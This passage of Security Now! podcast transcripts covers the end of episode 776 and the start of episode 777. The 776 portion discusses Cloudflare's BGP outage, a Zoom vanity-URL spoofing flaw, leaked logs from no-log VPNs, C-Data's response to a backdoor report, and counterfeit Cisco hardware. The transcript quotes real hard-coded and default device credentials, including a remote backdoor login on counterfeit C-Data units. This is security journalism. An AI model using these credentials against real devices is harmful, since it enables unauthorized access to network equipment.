STEVE:  But in the posting he did offer some interesting technical detail about their setup that I thought our listeners would find interesting.  He said:  "Cloudflare operates a backbone between many of our datacenters around the world.  The backbone is a series of private lines between our datacenters that we use for faster and more reliable paths between them.  These links allow us to carry traffic between different datacenters without going over the public Internet."



So what we used to call a "leased line," you know, where you're actually buying, probably, well, I'm sure fiber optic, some fiber optic carriage owned by AT&T or someone, just raw transit.  And there's no routers in line.  It's just these two points, Point A and Point B, are interconnected.  And in fact it's probably a big honeycomb with direct links to all of the various major datacenters.



So he said:  "We use this, for example, to reach a website origin server sitting in New York, carrying requests over our private backbone to both San Jose, California, as far as Frankfurt or So Paulo.  This additional option to avoid the public Internet allows a higher quality of service, as the private network can be used to avoid Internet congestion points.  With the backbone, we have far greater control over where and how to route Internet requests and traffic than the public Internet provides."



And of course we recently talked about BGP routing mistakes.  They're easy to make.  And when a mistake is made by an organization the size of Cloudflare, they're also hard to miss.  And this was exactly that.  There was some backbone congestion in their Atlanta, Georgia datacenter.  So the team decided to remove some of Atlanta's traffic by rerouting it to other datacenters on the backbone, essentially removing some routes that were pointing to Atlanta, where Atlanta's BGP was advertising a bunch of routes.  They thought, okay, we're going to reduce its advertisement spread so that other routers on the backbone will pick it up.



But there was an unappreciated comparison in routing preference levels which resulted in this unanticipated result.  Instead of removing the Atlanta routes from the backbone, the mistake caused the Atlanta router to start leaking all BGP routes into the backbone.  So Atlanta, remember we've talked about this before, the vocabulary of BGP in routing is weird.  So they said Atlanta was inadvertently advertising itself as the proper destination for all of Cloudflare's backbone traffic.  The other routers at the other datacenters that received Atlanta's updated BGP table, which essentially amounted to a bold "come hither," they shrugged and said okay, and Atlanta was immediately buried and collapsed.  As John put it:  "With the routes sent out, Atlanta started attracting traffic from across the backbone."



So, yup, they were embarrassed and apologetic.  And as we said, they already put safeguards in place so that nothing like that can happen again.  Let's hope that Twitter is going to do the same thing.



LEO:  Probably Twitter doesn't run BGP anywhere important.



STEVE:  No.  And you could just imagine.  I mean, I'm sure the team really knows its stuff.  This is the kind of thing where just it was a 100 versus a 200 in the priority list.  And it wasn't until it happened that someone said, uh, what's happening?  And then they had to dig down and find it.  The reason it took 27 minutes was that it wasn't obvious what the problem was.



LEO:  Right.



STEVE:  And so as soon as they found it, it was like, ah, and then they fixed it, and then the traffic got itself cleared up.



LEO:  I have to say I'm impressed by the forthrightness that Cloud - I mean, this is the code.  This is the error in the code.



STEVE:  Yes, exactly.  They're actually showing the line, yes.



LEO:  Yeah.  And I think that's great.  That's always reassuring.



STEVE:  That's why we love them.



LEO:  Yeah, it's why we love them.  And we would love John because he's a real geek, and he understands.  He gets it, yeah.



STEVE:  Yeah.  Any outfit that puts up a wall of lava lamps and aims a video camera at them as their source of entropy...



LEO:  And chaos.



STEVE:  What's not to love?  



LEO:  Yeah, yeah.  They're cool.  They're really cool.



STEVE:  So Zoom had a Vanity URL flaw.  That's literally what they call it.  They recently repaired another glitch which was discovered by, not surprisingly, Checkpoint.  Those guys have been busy lately.  Checkpoint responsibly and privately reported it to Zoom, and it was quickly fixed.  After it was fixed, the world learned of what had once been a problem.  I phrase it this way because I continue to see that the tech press appears to have fallen in love with the term "zero-day."



Now, everything is a zero-day vulnerability, even when it's not.  This incident was widely being called a "zero-day vulnerability."  It never was.  Those researchers we talked about last week, those two who disclosed severe vulnerabilities in C-Data's equipment, they created multiple zero-day vulnerabilities by irresponsibly going public with their disclosure and not giving the manufacturer any opportunity to respond, to fix the trouble, and push patches.



But Checkpoint and Zoom working behind the scenes to fix a problem before it became publicly known is not a zero-day.  Vulnerabilities are not zero-days when they are fixed before they are publicly revealed.  So I'm hoping that the tech press  hears this because it's a catchy term.  But if we start labeling everything a zero-day, then that's crying wolf.  And when something actually is one, then no one's going to notice.  So I hope we keep our terms straight.



Anyway, it turns out that Zoom allows the use of so-called "Vanity URLs."  And that's what they actually call them.  The link, I have it in the show notes, is "Guidelines for Vanity URL Requests."  You need to register your intention to basically create a subdomain of Zoom.us.  So Checkpoint discovered that due to improper account validation, any meeting ID could have been launched using any organization's Vanity URL, even if a meeting was set up by a separate individual account which had no relationship to the organization.  It's unclear from Checkpoint's disclosure whether there was actually any subdomain validation, though I assume there must have been some.  I mean, I hope so.



So what Checkpoint wrote to explain this is, they said:  "Upon setting up a meeting, an attacker could change the invitation link URL to include any registered subdomain."  Which is why it doesn't sound like there was much validation.  For instance, they said, if the original invitation link was https://zoom.us, right, regular, and then /j/ and then the serial number for the session, they write, the attacker could change it to https://organization's name, you know, like IBM or anything, Mozilla, .zoom.us/j/ and then the serial number.



So a victim receiving such an invitation would have had no way of knowing the invitation did not actually come from the actual organization, ibm.zoom.us or mozilla dot.  So, you know, just a phishing/spoofing attack.  But wow.  That shouldn't be allowed to just be done.  So as I said, it's unclear whether it was that easy.  I hope it wasn't.  And since it's fixed, it didn't merit any further digging on my part.  I didn't care to go any further.



But I noted that Checkpoint added an interesting statistic factoid at the end of their disclosure write-up.  They wrote:  "It's worth noting that 90% [nine zero percent] of cyberattacks today start with a phishing email."  They said:  "To make sure you're doing enough to protect your organization's attack vectors, we suggest that you read the whitepaper 'Humans are Your Weakest Link' to discover the daily risk posed by phishing emails."  If anyone's interested, you could probably google "phishing attacks put your business at risk."  That's in the URL.  Or I have the URL in the show notes.  If you click it, they solicit your name and organization name and email address.  But maybe it's worth it to you.  I mean, Checkpoint.  So it's not like nobody.



And I was curious also just sort of to see where Zoom was in the ecosystem world.  They're currently at 35.87% of the global web-based tele-whatever they are, teleconferencing solution, 35.87%; GoToWebinar, 22.44; and Cisco Webex at 17.18.  So they're the biggest now, but they're not bigger than everybody else combined or anything like that.  So still worth, you know, they're in the spotlight because they're catching all the headlines, and everybody is talking about "Zooming" now apparently has become a thing.  Turns out, and one of our sponsors will be glad to hear this, not all VPNs are created equal.



LEO:  Oh, boy, I saw this one, yeah.



STEVE:  We learned this week some specific details of something we probably always suspected, which is it really does matter which VPN provider one chooses.  There's a site, VPNmentor, which obtains its revenue from affiliate links to well-known and upstanding VPN providers.  One of them is a current sponsor on the TWiT network.  Recently, the user connection and activity logs of seven, on the surface apparently different, free VPN providers who all boasted about their "zero logging" services, were discovered on the Internet.  That is, yes, the connection and activity logs of seven VPN providers that don't log were discovered on the Internet, in the cloud, on an Elasticsearch database instance.



VPNmentor's research team, led by Noam Roten, discovered the database containing a staggering one billion database entries associated with approximately 20 million users.  So a little bit of division, an average of 50 log entries per user, despite the fact that each of the VPN services advertises, as I said, they are no-log VPNs.  The database contained Internet activity logs with personally identifiable data and email addresses, cleartext passwords, IP addresses, home addresses, phone numbers, device IDs, and other technical details.



The good news is they're not mainstream VPNs.  They are UFO VPN, Fast VPN - because I don't think Slow VPN would get many takers.  So Fast VPN, Free VPN, Super VPN, Flash VPN, Secure VPN because why not, and Rabbit VPN because rabbits are fast.  So while they all have separate names, they all appear to be connected to a common app developer who apparently white-labeled one product to multiple companies who were not very imaginative about their names.  But from the outside, the typical consumer would have absolutely no way of knowing.



I put one of the ad screens from Super VPN on the show notes.  And it says, you know, it's got Home; the Privacy Policy, that's where the no logging is said; Terms of Service.  And they say:  "Best VPN solution for Android.  Unblock the world freely and easily.  Reclaim your right to privacy.  Enjoy the open Internet."  And then there's the you can download their app for iOS from the App Store.  Get it on Google Play.  I mean, it looks absolutely like you'd expect.  And there's a big checkbox on the app showing, yes, you're checked.  And so for Super VPN, when you go look at the details, it's the best unlimited VPN proxy for Android.  Google Play Store has 4.6 stars and more than a million downloads.  One of the other ones I noted was 10 million, more than 10 million downloads.  The App Store ranks it at 4.9 stars.  The developer is Nownetmobi in Hong Kong.



So any unwitting user might be forgiven for thinking, hey, looks great.  A free VPN service sounds perfect.  Of course we know today a VPN service need not be expensive.  But if actual privacy and security is one's goal, I'd rather pay a fair price and have that actually provided.  It clearly does matter which provider one chooses.  And if all of your Internet traffic is coming out of a sketchy provider in Hong Kong, that just happens to be logging all of the data they have about you onto an exposed Elastic Cloud instance on the Internet, that's not the VPN provider that you want to use.  Just saying.



Apple recently updated its iOS and macOS with a handful of useful security patches.  There's not much detail because Apple doesn't provide much.  But I scanned them, and they looked important.  Useful, at least.  So for me, this happened Friday, I think, and I had to go into my general settings under both iPhones.  My iPhone 6 couldn't come to 13.  It came to, I don't know, 12.4.8 or something.  My iPhone 10 or X did go to 13 point whatever.  So anyway, I mentioned it in case you have to sort of solicit that update from Apple, as I did.



LEO:  You don't, normally.  The way it works is yes, you do, and I did, to get 13.6.  But the reason is because they do staged rollouts.  So everybody will get pushed it eventually, and you'll get a notification that there's an update.  But they don't do it right away.  So, yeah, once you read that there's an update, you can absolutely go to the updates and get it.  But they typically won't push it to you for a week or two after that.  Then they'll say, hey, there's an update.  Which actually is kind of the right way to do it because it gives people who want it right away a chance to get it, but it also gives it some time to sit and stew in case there's any issues.



STEVE:  Yeah.  And how many times have - yeah.  How many times have we said, agh, can I uninstall this thing?



LEO:  Yeah.



STEVE:  I also noted that Firefox Send is still not receiving.  And this is becoming a curious outage because you wouldn't think that requiring everyone to have an account tied to a verified email address, when that was already an option, nor adding a Report Abuse button would be a heavy lift for Mozilla.  So it's beginning to feel as though perhaps something more substantial might be going on behind the scenes.  And if they're able to make Firefox Send better by making it even more resistant to abuse in other ways, so that it doesn't again immediately fall victim to malware purveyors, I would say it's probably worth waiting for.  So I've just sort of been checking back.  And it's like, it's been a while now.  It's like, ah, that's sort of interesting that it's still off the grid.



I have a nice piece of listener feedback from Joe Lyon.  I saw his tweet a few days ago.  He said:  "I just had SpinRite save  my Dell E7450 Win7 Pro laptop."  He said:  "I recently booted the machine, and all my desktop icons, SQRL login, et cetera, were gone.  I did a search online, and it seems to be related to a corrupted profile in Windows.  There were detailed steps to take to recover my profile and try to get all of the information back.  Before taking all those steps and doing all that work, I thought I'd try SpinRite.  I booted the machine with FreeDOS and ran SpinRite on Level 2."  Actually, that machine has a solid-state drive, so that's what you want is just do a Level 2 scan.  "After about an hour I rebooted into Windows and, voila, it booted properly; and all my files, icons, programs were back where they should be.  Thank you, SpinRite and Steve."



Which leads me into a little bit of update on where SpinRite is.  And frankly, I have so much news on the SpinRite R&D front that I hardly know where to begin.  For one thing, our work so far has suggested and is suggesting to me that there may be far more that can be done with solid-state storage than I was expecting.  The timing results we're seeing from the benchmarks suggest that there's far more going on under the hood than we might expect from solid-state storage.  But then, you know, when thinking about it, of course the SSD engineers would be squeezing every last possible bit, literally, out of the technology that they're able to, just as was done with hard drives, which is what resulted in such a large recovery margin.



So I'm beginning to better understand why SpinRite has had so many reports of success with the recovery of data from solid-state storage.  I'm beginning to think that we'll eventually have some sort of solid-state storage assessment tool unlike anything that's been done before.  So that's all I'm going to say at this point.



LEO:  Oh, you're cagey.  Come on.



STEVE:  My spidey senses are kind of saying, oh, that's interesting.



LEO:  Interesting.



STEVE:  In other news, there's a timesaving approach that SpinRite will be able to use for any mass storage media, spinning or solid-state, when the actual transfer rate from the storage medium exceeds the transfer rate of its link to the system.  That won't be an issue with NVMe storage because they've solved the link problem.  There's no serial SATA bus there.  But it will when a fast-spinning drive capable of more than, for example, 300 MB/sec is stuck behind a SATA II link that maxes out at 300 MB/sec; or with a fast SSD that can read faster than SATA III's maximum, which is 600 MB/sec.



It's possible to ask a drive to verify that it's able to read from its physical media without actually bothering to transfer the data across the serial SATA link.  We have found that some drives apparently cheat when asked that, and immediately say, yeah, no problem.  So SpinRite will be carefully testing drives first by deliberately inducing an error, then checking to see whether the drive tells the truth and says whoops, or lies when asked and says no problem.  And the reason this is so exciting, when it can be done - and, I mean, basically drives are cheating.  They're in breach of spec when they just blow off what's called the "read verify" command.  But we've determined that a bunch of people have them that do.



So SpinRite will verify that it's authentic.  When it can be done, for drives that faithfully honor this read verify command, SpinRite will potentially be able to perform a full media test at a very practical speed.  One of the people testing the R&D code has a 500GB Samsung 850 EVO SSD.  The fastest we're able to read from it using the native command queuing which I was talking about before, is 528 MB/sec.  So when you consider that 600 is a theoretical maximum with no other overhead, 528 MB/sec, not bad.  But the Samsung SSDs properly honor the read verify, and they do real work when asked to.



So SpinRite will be able to scan any of those drives, and we've benchmarked that now at more than 800 MB/sec.  We measured for this particular hardware 806 MB/sec, which means that the entire 500GB drive can have its media scanned in less than 10.5 minutes.  It was actually 10.34, we calculated.  So that's going to be very cool.  I mean, that means even that multi-terabyte drives will be under an hour to do a full media scan with all of SpinRite's ability to really get down at the media.  So we're making great progress.



We're currently tracking down an obscure but reproducible behavior that only appears to affect some HP desktops with their BIOS with a particular setting, but it does happen to be the default.  So as soon as the podcast is finished this afternoon, I'll be returning to that.  We've got a terrific group of very patient testers, and we're having a great time nailing down the operation of this code, which will be incorporated into the next version of SpinRite.  So all making great progress and having a good time.



LEO:  Must be fun for you to come up against these roadblocks and figure them out, and then the next one, and slowly work your way through it, which is really cool.



STEVE:  Yeah, yeah.  We've had some neat comments from people who are just like people watching this process in the newsgroup, just amazed at, like - and that's always been my approach is we're going to make this work for every single possible instance.  And then when it launches, it works.



LEO:  Yeah.  It's a different kind of coding because, although I imagine all Windows coding is somewhat like this, you have such a heterogeneous environment you're working in, you can't just come up with an abstract answer and be done.  You have to test it against all these weird combinations of hardware, software, BIOSes.



STEVE:  It is true.  Although SQRL also, the client has been out now for quite a while.  No bugs.



LEO:  Yeah.



STEVE:  So it can be done.



LEO:  It can be done.  All right.



STEVE:  Okay.  So first of all, Leo, shortly after the surprise publication, which was our topic last week...



LEO:  That's right, yeah.



STEVE:  ...of Pierre Kim's and Alexandre Torres's findings of those seven severe and apparently deliberate egregious vulnerabilities, including hard-coded username and password backdoors for the device's telnet server, C-Data, the manufacturer whose name was on those devices, posted a statement on their website.  And I have to say I was very impressed with their response.  It was titled "Statement on Pierre Kim Revealing Security Vulnerabilities in C-Data OLT Products."



They said:  "C-Data noticed that Pierre Kim released security vulnerabilities in C-Data OLT on the GitHub website.  C-Data immediately started investigation and analysis.  We will give report as soon as possible.  C-Data adheres to protecting the ultimate interests of users with best efforts and provide customer with safety products.  Here, we express our appreciation for Pierre Kim's concern on C-Data products."  And considering the truth, this is probably the most gracious statement I've ever seen.



Okay.  So then at the bottom of that there's a link to the technical statement on this.  So they said:  "Statement on Pierre Kim Revealing Security Vulnerabilities in C-data OLT Products."  Get this:  "We have noticed an article named 'Multiple vulnerabilities found in C-Data OLTs' published in GitHub.  C-Data admires the work of two professionals in technological circles, Pierre Kim and Alexandre Torres, and thanks for their identifying security breach problems through detailed testing, as well as for their active work in reducing the risks of users using network products.  C-Data adheres to the philosophy of serving customers and always puts customers' interests in the first place, as well as pays special attention to the product safety problems.  In this way, C-Data can provide customers with products with safety guarantee.



"In the meantime, we have paid attention to some press releases published by the media, and have interpreted technical articles by Pierre Kim and Alexandre Torres.  In order not to let the majority of customers misunderstand the safety design of our equipment, C-Data analyzes and clarifies the mentioned technical issues with a sincere and frank manner."



First topic:  "Excluding counterfeit products.  The login account mentioned in this article" - and then they cite one of those four that we talked about, panger123 for the username, suma123 for the password.  "We have investigated the account and password.  In addition, we have confirmed that the account and password are not from the C-Data OLT products, but are those used by other companies and people when they copy the C-Data OLT hardware."



LEO:  Oh, my god.



STEVE:  Yeah.



LEO:  These are counterfeits.



STEVE:  Yes.



LEO:  Wow.



STEVE:  "The CLI style [Command Language Interpreter] and most of its commands of the counterfeited OLT are all copied from the C-Data OLT.  C-Data OLT equipment is now widely used around the world, and counterfeiters copy C-Data OLT for illegal profits.  According to the following screenshot, we can completely compare and analyze that the account of panger123/suma123 comes from an illegally copied OLT."



LEO:  Wow.



STEVE:  And then they show both.  And I do have that second screenshot later in the show notes because it shows telnet being used to log in with panger123, password suma123.  And then it says, well, it's misspelled, but it tried to say "entry superuser successfully" logged into the counterfeit system.  So unfortunately, these security guys didn't know about the counterfeiting problem that C-Data is all too aware of, and so unfortunately incorrectly accused C-Data of this behavior.  But there's more.



LEO:  So they were testing counterfeit devices.



STEVE:  Yes.



LEO:  Not the real deal.  Wow.



STEVE:  Yes.



LEO:  That's an interesting conundrum for security researchers.



STEVE:  It really is.



LEO:  Wow.



STEVE:  Yep.  So the second point, "Introduction to several factory settings accounts."  They said:  "The following two telnet login accounts and passwords mentioned in this article are actually" - that is, by Pierre and Alexandre - "are actually  used on the C-Data's first generation OLT, OLT starting with FD11XX."  And then they cite debug/debug124, root/root126.  "This account and password are mainly used by C-Data to assist customers in debugging problems and writing production parameters."  For example, they said:  "(OLT MAC address information and Serial Number information.)"



Get this:  "These accounts" - they said "this account," but they meant these accounts - "must be successfully logged in to the console port by the local serial line plugged into the OLT.  Then can entering the OLT bcm-shell mode to modify and view key information of the OLT.  Using this account under OLT telnet mode, we can only enter the CLI of the device.  We cannot enter OLT bcm-shell to modify any information of OLT."



In other words, those telnet usernames and password combinations which the security researchers found in the firmware can only be used when connecting to the device's hardwired local physical serial port, and even then only allow for viewing of the device's fixed information such as its network MAC addresses and its serial number.  You cannot get into the command shell and see anything or make any changes using those.  So again, this is standard default login, and that can be changed.



They said:  "If attacks want to enter the bcm-shell mode of OLT to obtain device privacy information or implant malicious programs into OLT, they must log into OLT by directly connecting the serial port line to the computer locally.  In this way, by no means can remote attackers use these two accounts to attack.  Therefore, there is no such situation as backdoor access with telnet."



And then I have a screenshot here, and I have it in the show notes, showing their authentic OLT device running the current firmware.  And an attempt was made after logging in with root and then root123, they tried to go into the shell.  And the response was only the console support is the response, meaning you can't get there from any network attached to the device, only by plugging a serial connection into the port.  And that's also standard.



I mean, I'm a Cisco user.  I've got Cisco equipment.  And there are many things you need to do.  You've got to click into their little RJ45 connector with this funky blue Cisco cable in order to get it to an RS232, then plug it into a serial port.  So these guys have done everything right.  And they also talk about the third account, guest/ with no password, which, you know, is like, really?  On that they say the account and password are the account of factory default configuration, which can only check some basic information of OLT, and without having the authority to configure any OLT.  The user can delete or modify the account as needed when using it.



And finally, they said:  "More secure cryptographic mechanism.  For other models" - because remember the other critique was HTTP and no use of crypto.  "For other models of C-Data OLTs named FD15XX, 16XX, 12XX, and 8000, the problem of backdoor access with telnet does not exist because these OLTs adopt a more secure cryptographic mechanism.  The device is configured with several general accounts by factory default, including root/admin, admin/admin, and guest/guest, which can be used by customers to initially configure OLT.  Customers need to create, delete, and modify the login account and password of the device according to their own security policies when using the device.  We do not recommend using the factory default username and password in the operation network.



"The device retains a debugging account for assisting customers in debugging and solving problems, and this account can also be used by customer to find the forgotten password when they forget the login password of OLT.  However, the account no longer uses the general password, and the password is calculated and generated according to the unique identification information of the customer's OLT.  Only when the customer provides the information of unique identification code in conjunction with a special password generation tool can the password be generated.  The password of each OLT is different, which will better ensure the safety of the device."



And C-Data's quite polite under the circumstances correction of the record continues like that for some time.  So as a result of the fact that Pierre Kim and Alexandre Torres misinterpreted what they saw and were using a counterfeit device at some point, and because they misinterpreted it, they chose not to first confront C-Data with their findings...



LEO:  And therein is the problem.



STEVE:  Yes.  Their vulnerability report was full of glaring inaccuracies.  The good news is that their mis-disclosure didn't actually put all of those C-Data customers' networks at risk because they never were at risk.  C-Data understood that any default access credentials need to be constrained to the device's local serial configuration port.  And that's the way the authentic device works.  But purchasers of counterfeit C-Data equipment were not so fortunate.



The screenshot below, which is the one I referred to before in my show notes, depicts a successful login to the counterfeit C-Data device over the network - not locally, but using the panger123/suma123 username/password credentials to which the counterfeit device declares super (S-U-P-P-E-R) uer (U-E-R) successfully, presumably attempting to say "superuser," meaning full god mode access to this thing, full remote admin access granted using the secret credentials buried in the firmware of the counterfeit high-end C-Data equipment.



So where does one purchase counterfeit equipment?  Certainly not from C-Data, nor from any reputable reseller.  Maybe this is the stuff that's found on eBay for a bargain.  I don't know.  So it brings us to a really interesting issue that we haven't touched on in nearly the 15 years of this podcast, which is counterfeit networking equipment, which turns out to be a real problem and a real thing.



F-Secure Labs just published a beautiful piece of their recent research - it was dated July 2020 - titled "The Fake Cisco:  Hunting for Backdoors in Counterfeit Cisco Devices."  I have a link to the Cisco PDF and to F-Secure's announcement of it.  And the PDF, this fake Cisco PDF is so cool that I wanted to make it easy for anyone to take a look at who was curious.  So I used this podcast episode's number as the grc.sc shortcut.  So grc.sc/776 will redirect you to this very cool PDF of Cisco's complete analysis of two different counterfeit Cisco routers.



And to kind of give us a sense for the reality of the world of counterfeiting, they said in their introduction:  "Producing counterfeit products is, and always has been, a great business if you don't mind being on the wrong side of the law.  There's no need to invest" in all that costly and, you know, well, they didn't say, I shouldn't editorialize.  Reading just what they wrote:  "There's no need to invest in a costly R&D process, and no need to select the best performing and looking materials.  The only criterion is the cost of manufacture.  This is why we see many imitations of expensive products on the market and are likely to continue to see them being made and sold at a fraction of the original's price."



You know, as I mentioned at the top of the show, like Rolex watches are famous, I mean, that's just like a clich of counterfeit now.  And women's handbags, and I guess shoes and all kinds of stuff are counterfeited.  And I've heard that there are DVD retailers in Hong Kong where, I mean, any movie you could ever imagine wanting for pennies on the dollar, and it looks like an absolute, you know, you can't tell by looking at it that it's not the real deal.



So anyway, continuing, F-Secure said:  "Network hardware designed, manufactured, and sold under the Cisco brand is a perfect example of this.  Having an excellent reputation because of their great engineering, these products sell at a premium price point.  Naturally, this encourages some to try and produce counterfeits as it's a way of making easy money.  Stories of such exploits abound in the media:  a gang reportedly exporting $10 million U.S. worth of gear to the U.S., the FBI seizing shipments of fake hardware, and court rulings being issued to stop the manufacturers.



"What does Cisco do to combat fraud?  Actually, a lot.  Cisco has a dedicated Brand Protection organization whose purpose is to defend against counterfeit and gray market activities.  They partner with customs teams and regional governments all over the world with success.  In April 2019 they seized $626,880 worth of counterfeit Cisco products in one day.  However, despite successful operations, Cisco has not been able to stop fraud fully.  If there's an opportunity to make a fast buck, there'll always be someone willing to take the risk.



"In fall of 2019, an IT company found some network switches failing after a software upgrade.  The company would find out later that they had inadvertently procured suspected counterfeit Cisco equipment.  Counterfeit devices quite often work smoothly for a long time, which makes it hard to detect them.  In this particular case, the hardware failure initiated a wider investigation to which the F-Secure Hardware Security team was called and asked to analyze the suspected counterfeit Cisco Catalyst 2960-X series switches.  This initiated a research project with the following goals:  Verify no extra functionality such as backdoor access was introduced; understand how and why counterfeit devices bypass the platform's authentication security controls.



"Naturally, it's not easy to tell genuine and counterfeit devices apart.  To verify whether any kind of backdoor functionality existed was also not easy, as it required a considerable amount of technical investigative work.  Ultimately, we concluded with a reasonable level of confidence that no backdoors had been introduced.  Furthermore, we identified the full exploit chain that allowed one of the forged products to function, a previously undocumented vulnerability in a security component" - actually it had a race condition - "which allowed the device's Secure Boot restrictions to be bypassed."



So the full report is 39 pages, and I found it utterly fascinating.  As I mentioned, grc.sc/776, this episode number, will take you there.  And Leo, on page 16 of the show notes I took from two separate pages of the PDF, I put the two images of the real and the counterfeit Cisco logic board, at least part of it, side by side.  And, I mean, it's just a copy.  You can see some slight changes in some component choices, looks like some smaller components were placed on the switch interface chips.  They're larger on the Cisco on the left, smaller on the copy on the right.  But, I mean, Cisco uses PowerPC as their main driver.  Its heat sink is a little bit larger.  But again, it looks like the circuit board was...



LEO:  You couldn't, on surface examination, you couldn't - there's no way to know.  I mean, it looks like the same circuit board, practically.



STEVE:  Yeah, it's got Cisco's, not surprisingly, Cisco's name and number.  I guess there's a...



LEO:  The holographic thing.



STEVE:  Above the processor, yes, the holographic thing is missing.



LEO:  Yeah.  That's what you want to see.



STEVE:  But you wouldn't know from the other board that it was supposed to have one.



LEO:  Right, there's circuitry there, yeah.



STEVE:  So again - yeah.  You would open it up and, like, there's nothing to see.



LEO:  Always look for that holographic sticker.  That's why they do that.  That's apparently hard to counterfeit, I guess.



STEVE:  Ah, interesting.



LEO:  Maybe, yeah.



STEVE:  I wonder why it would be hard.  But you're right.



LEO:  Yeah, I wonder why, too.  I know they do it in money, too, so there must be something about it, yeah.



STEVE:  Yeah.  So as it happens, though, F-Secure closely examined two devices that were both Cisco counterfeits.  They were both running authentic Cisco firmware and software.  So here the bad guys' goal was not to introduce a backdoor.  They just wanted to sell a knockoff at a somewhat reduced price, at probably a much, I mean, it looks like it would cost them, depending upon their production facility, I don't know what quality control Cisco adds.  Maybe they use cheaper fans and a cheaper power supply.



But, you know, a PC board is pretty much a PC board.  And if it works, it works.  And even as F-Secure said, hey, you know, these counterfeits typically work just as well.  But it was an update to the firmware that caused them to be caught out because the workaround for the firmware authentication, the Secure Boot technology essentially, broke when the product was updated.  So they were both running authentic Cisco firmware and software at purchase.



The first counterfeit contained add-on circuitry which exploited a race condition in the boot ROM code to bypass its software verification.  It did this by intercepting EEPROM control signals, replacing certain bytes in the image being loaded to modify the software's behavior on the fly.  It appears the processor's printed circuit board in this unit was an exact copy of Cisco's without modification.  So they sort of grafted it.  And actually it's on the underside of the PCB so you don't see it unless you take the whole thing apart and look at the bottom side, where you would say, hey, what's that little turtle, black turtle with the wires all over the place?  There is a picture of it, of the underside of the circuit board in their PDF.



When the first counterfeit received what amounted to a post-manufacturing add-on circuitry, the printed circuit - whereas.  Yeah, there you're showing it now is the graph that was made to do an EEPROM intercept on the fly, which is very clever, yeah.  Okay.  So the first counterfeit received what amounted to a post-manufacturing add-on circuitry, and no change at all to the Cisco circuit board, which was interesting.  I mean, it is a clone copy of the PCB.  But the printed circuit board design of the second counterfeit was changed to incorporate that hack made to the first counterfeit, which replaced the EEPROM completely with an unknown integrated circuit.



This signified to F-Secure that a considerable resource investment had been made in design, manufacture, and testing of a forged product like this, compared to the lower cost ad hoc approach used by the first counterfeit.  The board layout and silkscreen labeling similarities also suggested that the people behind the second forgery may have either had access to Cisco's proprietary engineering documentation, such as printed circuit board design files, in order to be able to modify them, or they invested quite heavily in the very complex process of replicating the original board design files in order to modify them, in order to modify the actual circuit board wiring, in order to create this.  And you know, it sort of brings up a point, too.  Cisco probably manufactures this stuff in the Far East, I would imagine.



LEO:  Yeah.  It may well be made in the same factory.



STEVE:  Uh-huh.



LEO:  Yeah, that's my guess.  Yeah.



STEVE:  They turn the production line back on at night.



LEO:  Mm-hmm.  Mm-hmm.



STEVE:  And run off a few more copies.  So in the case of the C-Data counterfeit, a seriously dangerous, remotely accessible backdoor was definitely installed into the counterfeit devices.  In the case of the extremely elaborate Cisco counterfeits, all the ingenuity was expended in creating a virtually indistinguishable clone of the original and then engineering around Cisco's detection that its prized network operating system was running in counterfeit and unauthorized hardware.  So an interesting tale of two counterfeits.



LEO:  Amazing, yeah.  Really amazing, yeah.  Wow, what a great story.  And what a great show.  Thank you, Steve.  Security Now! airs every Tuesday, if you want to watch the live version of the show.  Start time's a little tricky.  It's the third show of the day.  Things get pushed a little bit sometimes.  But usually we're trying to hit 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  If you tune in and MacBreak Weekly's still on, well, just stay tuned, and Security Now! will come along eventually.  Just watch it at the stream which is twit.tv/live.  There's audio and video there.



After the fact, the shows are available on Steve's site, as well as our site.  Steve's site is GRC.com.  That's where you'll find out about SpinRite, the world's best hard drive maintenance and recovery utility.  And you can get your copy of 6.0 ready for 6.1, an automatic upgrade if you do that now.  Plus you can participate in the beta tests and all the things he's trying out.



While you're at the site, 16Kb versions of audio for the show are there, as well as 64Kb audio, as well as transcripts.  And a lot of people like those transcripts, and I use them all the time for search because, if you're searching, you can almost always find what you're looking for in the transcripts and jump to that part of the audio.  So that's GRC.com.  Steve's also on Twitter.  He's @SGgrc.  And that's a good place to go if you want to message him.  He takes direct messages and engages at Twitter:  @SGgrc.  Or you can go to GRC.com/feedback and leave something on the feedback form.



Our site is TWiT, of course, TWiT.tv/sn for this show.  You'll find copies of audio and video there.  We do video, as well.  You'll also find it on YouTube, the videos on YouTube.  There's a Security Now! channel.  Best thing to do, get a podcast program and subscribe so you get the episode the minute it's available.  And you can begin your collection.  Collect all, what is it, 776.  Get the complete set of Security Now! episodes.  And Steve, 777 next week.



STEVE:  Ooh, cool, yes.



LEO:  Yeah, it'll be fun.  Good luck number if there ever was one.  Thanks, Steve.  We'll see you next time on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#777

DATE:		July 28, 2020

TITLE:		rwxrwxrwx

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-777.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we revisit the trouble with F5 Networks' BIG-IP devices, we update on the epic Twitter hack, and we look at a security update for GnuTLS.  We also cover the big five-day Garmin outage and Cisco's latest troubles.  We'll point out a new Win10 debloater app and a bit of errata.  Then I want to wrap up by sharing some truly surprising and interesting results that are emerging from my work on the pre-SpinRite hyper-accurate storage benchmark.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He's ready to go.  Big trouble in BIG-IP, we'll talk about that.  The Garmin ransomware breach, disk benchmarking, and another reason why you should be very afraid of GnuTLS.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 777, recorded Tuesday, July 28th, 2020:  rwxrwxrwx.



It's time for Security Now!, the show where we protect you and your loved ones by setting your permissions high.  This is the guy who puts the wall up, protects us all, Mr. Steve Gibson of GRC.com.  Hey, Steve.



STEVE GIBSON:  Hello, Leo.  Great to be with you again.  This is a landmark episode, 777.



LEO:  Triple seven.



STEVE:  And we have a fun show title, too, for those geeky among us:  rwxrwxrwx.



LEO:  Now, let me ask you.  When you use chmod, do you prefer chmod 777?



STEVE:  No.



LEO:  Or do you prefer u+rwx?



STEVE:  Oh, I see, the style.



LEO:  Do you use the letters?



STEVE:  No, I like to explicitly specify...



LEO:  You like numbers.



